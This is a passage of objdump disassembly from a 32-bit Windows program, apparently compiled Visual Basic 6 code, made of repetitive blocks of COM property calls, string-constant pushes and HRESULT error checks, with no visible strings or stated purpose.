  404e06:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404e09:	ff 15 f0 10 40 00    	call   *0x4010f0
  404e0f:	8b d7                	mov    %edi,%edx
  404e11:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404e17:	50                   	push   %eax
  404e18:	57                   	push   %edi
  404e19:	e9 d3 fc ff ff       	jmp    0x404af1
  404e1e:	8b 0e                	mov    (%esi),%ecx
  404e20:	56                   	push   %esi
  404e21:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404e27:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404e2a:	50                   	push   %eax
  404e2b:	52                   	push   %edx
  404e2c:	ff d3                	call   *%ebx
  404e2e:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404e34:	8b 06                	mov    (%esi),%eax
  404e36:	56                   	push   %esi
  404e37:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404e3d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404e40:	50                   	push   %eax
  404e41:	51                   	push   %ecx
  404e42:	ff d3                	call   *%ebx
  404e44:	8b f8                	mov    %eax,%edi
  404e46:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404e49:	50                   	push   %eax
  404e4a:	57                   	push   %edi
  404e4b:	8b 17                	mov    (%edi),%edx
  404e4d:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404e53:	85 c0                	test   %eax,%eax
  404e55:	db e2                	fnclex
  404e57:	7d 12                	jge    0x404e6b
  404e59:	68 a0 00 00 00       	push   $0xa0
  404e5e:	68 84 2a 40 00       	push   $0x402a84
  404e63:	57                   	push   %edi
  404e64:	50                   	push   %eax
  404e65:	ff 15 38 10 40 00    	call   *0x401038
  404e6b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404e6e:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404e74:	52                   	push   %edx
  404e75:	68 68 2b 40 00       	push   $0x402b68
  404e7a:	8b 39                	mov    (%ecx),%edi
  404e7c:	ff 15 30 10 40 00    	call   *0x401030
  404e82:	8b d0                	mov    %eax,%edx
  404e84:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404e87:	ff 15 f0 10 40 00    	call   *0x4010f0
  404e8d:	89 bd 98 fe ff ff    	mov    %edi,-0x168(%ebp)
  404e93:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404e99:	50                   	push   %eax
  404e9a:	8b 85 98 fe ff ff    	mov    -0x168(%ebp),%eax
  404ea0:	57                   	push   %edi
  404ea1:	e9 e3 fc ff ff       	jmp    0x404b89
  404ea6:	8b 16                	mov    (%esi),%edx
  404ea8:	56                   	push   %esi
  404ea9:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404eaf:	50                   	push   %eax
  404eb0:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404eb3:	50                   	push   %eax
  404eb4:	ff d3                	call   *%ebx
  404eb6:	8b 0e                	mov    (%esi),%ecx
  404eb8:	56                   	push   %esi
  404eb9:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404ebf:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404ec5:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404ec8:	50                   	push   %eax
  404ec9:	52                   	push   %edx
  404eca:	ff d3                	call   *%ebx
  404ecc:	8b f8                	mov    %eax,%edi
  404ece:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404ed1:	51                   	push   %ecx
  404ed2:	57                   	push   %edi
  404ed3:	8b 07                	mov    (%edi),%eax
  404ed5:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  404edb:	85 c0                	test   %eax,%eax
  404edd:	db e2                	fnclex
  404edf:	7d 12                	jge    0x404ef3
  404ee1:	68 a0 00 00 00       	push   $0xa0
  404ee6:	68 84 2a 40 00       	push   $0x402a84
  404eeb:	57                   	push   %edi
  404eec:	50                   	push   %eax
  404eed:	ff 15 38 10 40 00    	call   *0x401038
  404ef3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404ef6:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  404efc:	50                   	push   %eax
  404efd:	68 70 2b 40 00       	push   $0x402b70
  404f02:	8b 3a                	mov    (%edx),%edi
  404f04:	ff 15 30 10 40 00    	call   *0x401030
  404f0a:	8b d0                	mov    %eax,%edx
  404f0c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404f0f:	ff 15 f0 10 40 00    	call   *0x4010f0
  404f15:	8b cf                	mov    %edi,%ecx
  404f17:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404f1d:	50                   	push   %eax
  404f1e:	57                   	push   %edi
  404f1f:	e9 83 23 00 00       	jmp    0x4072a7
  404f24:	8b 06                	mov    (%esi),%eax
  404f26:	56                   	push   %esi
  404f27:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404f2d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404f30:	50                   	push   %eax
  404f31:	51                   	push   %ecx
  404f32:	ff d3                	call   *%ebx
  404f34:	8b 16                	mov    (%esi),%edx
  404f36:	56                   	push   %esi
  404f37:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404f3d:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404f43:	50                   	push   %eax
  404f44:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404f47:	50                   	push   %eax
  404f48:	ff d3                	call   *%ebx
  404f4a:	8b f8                	mov    %eax,%edi
  404f4c:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404f4f:	52                   	push   %edx
  404f50:	57                   	push   %edi
  404f51:	8b 0f                	mov    (%edi),%ecx
  404f53:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404f59:	85 c0                	test   %eax,%eax
  404f5b:	db e2                	fnclex
  404f5d:	7d 12                	jge    0x404f71
  404f5f:	68 a0 00 00 00       	push   $0xa0
  404f64:	68 84 2a 40 00       	push   $0x402a84
  404f69:	57                   	push   %edi
  404f6a:	50                   	push   %eax
  404f6b:	ff 15 38 10 40 00    	call   *0x401038
  404f71:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404f74:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404f7a:	51                   	push   %ecx
  404f7b:	68 78 2b 40 00       	push   $0x402b78
  404f80:	8b 38                	mov    (%eax),%edi
  404f82:	ff 15 30 10 40 00    	call   *0x401030
  404f88:	8b d0                	mov    %eax,%edx
  404f8a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404f8d:	ff 15 f0 10 40 00    	call   *0x4010f0
  404f93:	8b d7                	mov    %edi,%edx
  404f95:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404f9b:	50                   	push   %eax
  404f9c:	57                   	push   %edi
  404f9d:	e9 4f fb ff ff       	jmp    0x404af1
  404fa2:	8b 0e                	mov    (%esi),%ecx
  404fa4:	56                   	push   %esi
  404fa5:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404fab:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404fae:	50                   	push   %eax
  404faf:	52                   	push   %edx
  404fb0:	ff d3                	call   *%ebx
  404fb2:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404fb8:	8b 06                	mov    (%esi),%eax
  404fba:	56                   	push   %esi
  404fbb:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404fc1:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404fc4:	50                   	push   %eax
  404fc5:	51                   	push   %ecx
  404fc6:	ff d3                	call   *%ebx
  404fc8:	8b f8                	mov    %eax,%edi
  404fca:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404fcd:	50                   	push   %eax
  404fce:	57                   	push   %edi
  404fcf:	8b 17                	mov    (%edi),%edx
  404fd1:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404fd7:	85 c0                	test   %eax,%eax
  404fd9:	db e2                	fnclex
  404fdb:	7d 12                	jge    0x404fef
  404fdd:	68 a0 00 00 00       	push   $0xa0
  404fe2:	68 84 2a 40 00       	push   $0x402a84
  404fe7:	57                   	push   %edi
  404fe8:	50                   	push   %eax
  404fe9:	ff 15 38 10 40 00    	call   *0x401038
  404fef:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404ff2:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404ff8:	52                   	push   %edx
  404ff9:	68 a4 24 40 00       	push   $0x4024a4
  404ffe:	8b 39                	mov    (%ecx),%edi
  405000:	ff 15 30 10 40 00    	call   *0x401030
  405006:	8b d0                	mov    %eax,%edx
  405008:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40500b:	ff 15 f0 10 40 00    	call   *0x4010f0
  405011:	89 bd 8c fe ff ff    	mov    %edi,-0x174(%ebp)
  405017:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40501d:	50                   	push   %eax
  40501e:	8b 85 8c fe ff ff    	mov    -0x174(%ebp),%eax
  405024:	57                   	push   %edi
  405025:	e9 5f fb ff ff       	jmp    0x404b89
  40502a:	8b 16                	mov    (%esi),%edx
  40502c:	56                   	push   %esi
  40502d:	ff 92 08 03 00 00    	call   *0x308(%edx)
  405033:	50                   	push   %eax
  405034:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405037:	50                   	push   %eax
  405038:	ff d3                	call   *%ebx
  40503a:	8b 0e                	mov    (%esi),%ecx
  40503c:	56                   	push   %esi
  40503d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405043:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  405049:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40504c:	50                   	push   %eax
  40504d:	52                   	push   %edx
  40504e:	ff d3                	call   *%ebx
  405050:	8b f8                	mov    %eax,%edi
  405052:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405055:	51                   	push   %ecx
  405056:	57                   	push   %edi
  405057:	8b 07                	mov    (%edi),%eax
  405059:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40505f:	85 c0                	test   %eax,%eax
  405061:	db e2                	fnclex
  405063:	7d 12                	jge    0x405077
  405065:	68 a0 00 00 00       	push   $0xa0
  40506a:	68 84 2a 40 00       	push   $0x402a84
  40506f:	57                   	push   %edi
  405070:	50                   	push   %eax
  405071:	ff 15 38 10 40 00    	call   *0x401038
  405077:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40507a:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405080:	50                   	push   %eax
  405081:	68 80 2b 40 00       	push   $0x402b80
  405086:	8b 3a                	mov    (%edx),%edi
  405088:	ff 15 30 10 40 00    	call   *0x401030
  40508e:	8b d0                	mov    %eax,%edx
  405090:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405093:	ff 15 f0 10 40 00    	call   *0x4010f0
  405099:	8b cf                	mov    %edi,%ecx
  40509b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4050a1:	50                   	push   %eax
  4050a2:	57                   	push   %edi
  4050a3:	e9 ff 21 00 00       	jmp    0x4072a7
  4050a8:	8b 06                	mov    (%esi),%eax
  4050aa:	56                   	push   %esi
  4050ab:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4050b1:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4050b4:	50                   	push   %eax
  4050b5:	51                   	push   %ecx
  4050b6:	ff d3                	call   *%ebx
  4050b8:	8b 16                	mov    (%esi),%edx
  4050ba:	56                   	push   %esi
  4050bb:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4050c1:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4050c7:	50                   	push   %eax
  4050c8:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4050cb:	50                   	push   %eax
  4050cc:	ff d3                	call   *%ebx
  4050ce:	8b f8                	mov    %eax,%edi
  4050d0:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4050d3:	52                   	push   %edx
  4050d4:	57                   	push   %edi
  4050d5:	8b 0f                	mov    (%edi),%ecx
  4050d7:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4050dd:	85 c0                	test   %eax,%eax
  4050df:	db e2                	fnclex
  4050e1:	7d 12                	jge    0x4050f5
  4050e3:	68 a0 00 00 00       	push   $0xa0
  4050e8:	68 84 2a 40 00       	push   $0x402a84
  4050ed:	57                   	push   %edi
  4050ee:	50                   	push   %eax
  4050ef:	ff 15 38 10 40 00    	call   *0x401038
  4050f5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4050f8:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4050fe:	51                   	push   %ecx
  4050ff:	68 ac 24 40 00       	push   $0x4024ac
  405104:	8b 38                	mov    (%eax),%edi
  405106:	ff 15 30 10 40 00    	call   *0x401030
  40510c:	8b d0                	mov    %eax,%edx
  40510e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405111:	ff 15 f0 10 40 00    	call   *0x4010f0
  405117:	8b d7                	mov    %edi,%edx
  405119:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40511f:	50                   	push   %eax
  405120:	57                   	push   %edi
  405121:	e9 cb f9 ff ff       	jmp    0x404af1
  405126:	8b 0e                	mov    (%esi),%ecx
  405128:	56                   	push   %esi
  405129:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40512f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405132:	50                   	push   %eax
  405133:	52                   	push   %edx
  405134:	ff d3                	call   *%ebx
  405136:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40513c:	8b 06                	mov    (%esi),%eax
  40513e:	56                   	push   %esi
  40513f:	ff 90 08 03 00 00    	call   *0x308(%eax)
  405145:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405148:	50                   	push   %eax
  405149:	51                   	push   %ecx
  40514a:	ff d3                	call   *%ebx
  40514c:	8b f8                	mov    %eax,%edi
  40514e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405151:	50                   	push   %eax
  405152:	57                   	push   %edi
  405153:	8b 17                	mov    (%edi),%edx
  405155:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40515b:	85 c0                	test   %eax,%eax
  40515d:	db e2                	fnclex
  40515f:	7d 12                	jge    0x405173
  405161:	68 a0 00 00 00       	push   $0xa0
  405166:	68 84 2a 40 00       	push   $0x402a84
  40516b:	57                   	push   %edi
  40516c:	50                   	push   %eax
  40516d:	ff 15 38 10 40 00    	call   *0x401038
  405173:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405176:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40517c:	52                   	push   %edx
  40517d:	68 88 2b 40 00       	push   $0x402b88
  405182:	8b 39                	mov    (%ecx),%edi
  405184:	ff 15 30 10 40 00    	call   *0x401030
  40518a:	8b d0                	mov    %eax,%edx
  40518c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40518f:	ff 15 f0 10 40 00    	call   *0x4010f0
  405195:	89 bd 80 fe ff ff    	mov    %edi,-0x180(%ebp)
  40519b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4051a1:	50                   	push   %eax
  4051a2:	8b 85 80 fe ff ff    	mov    -0x180(%ebp),%eax
  4051a8:	57                   	push   %edi
  4051a9:	e9 db f9 ff ff       	jmp    0x404b89
  4051ae:	8b 16                	mov    (%esi),%edx
  4051b0:	56                   	push   %esi
  4051b1:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4051b7:	50                   	push   %eax
  4051b8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4051bb:	50                   	push   %eax
  4051bc:	ff d3                	call   *%ebx
  4051be:	8b 0e                	mov    (%esi),%ecx
  4051c0:	56                   	push   %esi
  4051c1:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4051c7:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4051cd:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4051d0:	50                   	push   %eax
  4051d1:	52                   	push   %edx
  4051d2:	ff d3                	call   *%ebx
  4051d4:	8b f8                	mov    %eax,%edi
  4051d6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4051d9:	51                   	push   %ecx
  4051da:	57                   	push   %edi
  4051db:	8b 07                	mov    (%edi),%eax
  4051dd:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4051e3:	85 c0                	test   %eax,%eax
  4051e5:	db e2                	fnclex
  4051e7:	7d 12                	jge    0x4051fb
  4051e9:	68 a0 00 00 00       	push   $0xa0
  4051ee:	68 84 2a 40 00       	push   $0x402a84
  4051f3:	57                   	push   %edi
  4051f4:	50                   	push   %eax
  4051f5:	ff 15 38 10 40 00    	call   *0x401038
  4051fb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4051fe:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405204:	50                   	push   %eax
  405205:	68 90 2b 40 00       	push   $0x402b90
  40520a:	8b 3a                	mov    (%edx),%edi
  40520c:	ff 15 30 10 40 00    	call   *0x401030
  405212:	8b d0                	mov    %eax,%edx
  405214:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405217:	ff 15 f0 10 40 00    	call   *0x4010f0
  40521d:	8b cf                	mov    %edi,%ecx
  40521f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405225:	50                   	push   %eax
  405226:	57                   	push   %edi
  405227:	e9 7b 20 00 00       	jmp    0x4072a7
  40522c:	8b 06                	mov    (%esi),%eax
  40522e:	56                   	push   %esi
  40522f:	ff 90 08 03 00 00    	call   *0x308(%eax)
  405235:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405238:	50                   	push   %eax
  405239:	51                   	push   %ecx
  40523a:	ff d3                	call   *%ebx
  40523c:	8b 16                	mov    (%esi),%edx
  40523e:	56                   	push   %esi
  40523f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405245:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40524b:	50                   	push   %eax
  40524c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40524f:	50                   	push   %eax
  405250:	ff d3                	call   *%ebx
  405252:	8b f8                	mov    %eax,%edi
  405254:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405257:	52                   	push   %edx
  405258:	57                   	push   %edi
  405259:	8b 0f                	mov    (%edi),%ecx
  40525b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405261:	85 c0                	test   %eax,%eax
  405263:	db e2                	fnclex
  405265:	7d 12                	jge    0x405279
  405267:	68 a0 00 00 00       	push   $0xa0
  40526c:	68 84 2a 40 00       	push   $0x402a84
  405271:	57                   	push   %edi
  405272:	50                   	push   %eax
  405273:	ff 15 38 10 40 00    	call   *0x401038
  405279:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40527c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405282:	51                   	push   %ecx
  405283:	68 b4 24 40 00       	push   $0x4024b4
  405288:	8b 38                	mov    (%eax),%edi
  40528a:	ff 15 30 10 40 00    	call   *0x401030
  405290:	8b d0                	mov    %eax,%edx
  405292:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405295:	ff 15 f0 10 40 00    	call   *0x4010f0
  40529b:	8b d7                	mov    %edi,%edx
  40529d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4052a3:	50                   	push   %eax
  4052a4:	57                   	push   %edi
  4052a5:	e9 47 f8 ff ff       	jmp    0x404af1
  4052aa:	8b 0e                	mov    (%esi),%ecx
  4052ac:	56                   	push   %esi
  4052ad:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4052b3:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4052b6:	50                   	push   %eax
  4052b7:	52                   	push   %edx
  4052b8:	ff d3                	call   *%ebx
  4052ba:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4052c0:	8b 06                	mov    (%esi),%eax
  4052c2:	56                   	push   %esi
  4052c3:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4052c9:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4052cc:	50                   	push   %eax
  4052cd:	51                   	push   %ecx
  4052ce:	ff d3                	call   *%ebx
  4052d0:	8b 10                	mov    (%eax),%edx
  4052d2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4052d5:	51                   	push   %ecx
  4052d6:	50                   	push   %eax
  4052d7:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4052dd:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4052e3:	85 c0                	test   %eax,%eax
  4052e5:	db e2                	fnclex
  4052e7:	7d 18                	jge    0x405301
  4052e9:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4052ef:	68 a0 00 00 00       	push   $0xa0
  4052f4:	68 84 2a 40 00       	push   $0x402a84
  4052f9:	52                   	push   %edx
  4052fa:	50                   	push   %eax
  4052fb:	ff 15 38 10 40 00    	call   *0x401038
  405301:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405304:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  40530a:	89 45 98             	mov    %eax,-0x68(%ebp)
  40530d:	b8 08 00 00 00       	mov    $0x8,%eax
  405312:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405315:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40531c:	89 45 90             	mov    %eax,-0x70(%ebp)
  40531f:	c7 85 58 ff ff ff 9c 	movl   $0x40249c,-0xa8(%ebp)
  405326:	24 40 00 
  405329:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40532f:	ff 15 e8 10 40 00    	call   *0x4010e8
  405335:	c7 85 68 ff ff ff 8c 	movl   $0x40238c,-0x98(%ebp)
  40533c:	23 40 00 
  40533f:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  405345:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405348:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  40534f:	00 00 00 
  405352:	ff 15 e8 10 40 00    	call   *0x4010e8
  405358:	33 c0                	xor    %eax,%eax
  40535a:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  405360:	0f 94 c0             	sete   %al
  405363:	f7 d8                	neg    %eax
  405365:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405368:	66 89 85 78 ff ff ff 	mov    %ax,-0x88(%ebp)
  40536f:	8d 55 c0             	lea    -0x40(%ebp),%edx
  405372:	51                   	push   %ecx
  405373:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  405379:	52                   	push   %edx
  40537a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40537d:	50                   	push   %eax
  40537e:	51                   	push   %ecx
  40537f:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  405386:	00 00 00 
  405389:	ff 15 cc 10 40 00    	call   *0x4010cc
  40538f:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405395:	8d 45 90             	lea    -0x70(%ebp),%eax
  405398:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40539b:	50                   	push   %eax
  40539c:	8b 3a                	mov    (%edx),%edi
  40539e:	8d 55 80             	lea    -0x80(%ebp),%edx
  4053a1:	51                   	push   %ecx
  4053a2:	52                   	push   %edx
  4053a3:	ff 15 b0 10 40 00    	call   *0x4010b0
  4053a9:	50                   	push   %eax
  4053aa:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4053ad:	50                   	push   %eax
  4053ae:	ff 15 a8 10 40 00    	call   *0x4010a8
  4053b4:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4053ba:	50                   	push   %eax
  4053bb:	51                   	push   %ecx
  4053bc:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  4053c2:	85 c0                	test   %eax,%eax
  4053c4:	db e2                	fnclex
  4053c6:	0f 8d 06 15 00 00    	jge    0x4068d2
  4053cc:	e9 e9 14 00 00       	jmp    0x4068ba
  4053d1:	8b 16                	mov    (%esi),%edx
  4053d3:	56                   	push   %esi
  4053d4:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4053da:	50                   	push   %eax
  4053db:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4053de:	50                   	push   %eax
  4053df:	ff d3                	call   *%ebx
  4053e1:	8b 0e                	mov    (%esi),%ecx
  4053e3:	56                   	push   %esi
  4053e4:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4053ea:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4053f0:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4053f3:	50                   	push   %eax
  4053f4:	52                   	push   %edx
  4053f5:	ff d3                	call   *%ebx
  4053f7:	8b 08                	mov    (%eax),%ecx
  4053f9:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4053fc:	52                   	push   %edx
  4053fd:	50                   	push   %eax
  4053fe:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  405404:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40540a:	85 c0                	test   %eax,%eax
  40540c:	db e2                	fnclex
  40540e:	7d 18                	jge    0x405428
  405410:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  405416:	68 a0 00 00 00       	push   $0xa0
  40541b:	68 84 2a 40 00       	push   $0x402a84
  405420:	51                   	push   %ecx
  405421:	50                   	push   %eax
  405422:	ff 15 38 10 40 00    	call   *0x401038
  405428:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40542b:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405431:	89 45 98             	mov    %eax,-0x68(%ebp)
  405434:	b8 08 00 00 00       	mov    $0x8,%eax
  405439:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40543c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  405443:	89 45 90             	mov    %eax,-0x70(%ebp)
  405446:	c7 85 58 ff ff ff 40 	movl   $0x402b40,-0xa8(%ebp)
  40544d:	2b 40 00 
  405450:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  405456:	ff 15 e8 10 40 00    	call   *0x4010e8
  40545c:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  405462:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405465:	c7 85 68 ff ff ff 98 	movl   $0x402b98,-0x98(%ebp)
  40546c:	2b 40 00 
  40546f:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  405476:	00 00 00 
  405479:	ff 15 e8 10 40 00    	call   *0x4010e8
  40547f:	33 d2                	xor    %edx,%edx
  405481:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  405487:	0f 94 c2             	sete   %dl
  40548a:	f7 da                	neg    %edx
  40548c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40548f:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  405496:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405499:	50                   	push   %eax
  40549a:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  4054a0:	51                   	push   %ecx
  4054a1:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4054a4:	52                   	push   %edx
  4054a5:	50                   	push   %eax
  4054a6:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  4054ad:	00 00 00 
  4054b0:	ff 15 cc 10 40 00    	call   *0x4010cc
  4054b6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4054bc:	8d 55 90             	lea    -0x70(%ebp),%edx
  4054bf:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4054c2:	52                   	push   %edx
  4054c3:	8b 39                	mov    (%ecx),%edi
  4054c5:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  4054c8:	50                   	push   %eax
  4054c9:	51                   	push   %ecx
  4054ca:	ff 15 b0 10 40 00    	call   *0x4010b0
  4054d0:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4054d3:	50                   	push   %eax
  4054d4:	52                   	push   %edx
  4054d5:	ff 15 a8 10 40 00    	call   *0x4010a8
  4054db:	50                   	push   %eax
  4054dc:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4054e2:	50                   	push   %eax
  4054e3:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  4054e9:	85 c0                	test   %eax,%eax
  4054eb:	db e2                	fnclex
  4054ed:	7d 18                	jge    0x405507
  4054ef:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4054f5:	68 a4 00 00 00       	push   $0xa4
  4054fa:	68 84 2a 40 00       	push   $0x402a84
  4054ff:	51                   	push   %ecx
  405500:	50                   	push   %eax
  405501:	ff 15 38 10 40 00    	call   *0x401038
  405507:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40550a:	ff 15 08 11 40 00    	call   *0x401108
  405510:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405513:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405516:	52                   	push   %edx
  405517:	50                   	push   %eax
  405518:	6a 02                	push   $0x2
  40551a:	ff 15 24 10 40 00    	call   *0x401024
  405520:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405523:	8d 55 a0             	lea    -0x60(%ebp),%edx
  405526:	51                   	push   %ecx
  405527:	8d 45 90             	lea    -0x70(%ebp),%eax
  40552a:	52                   	push   %edx
  40552b:	8d 4d b0             	lea    -0x50(%ebp),%ecx
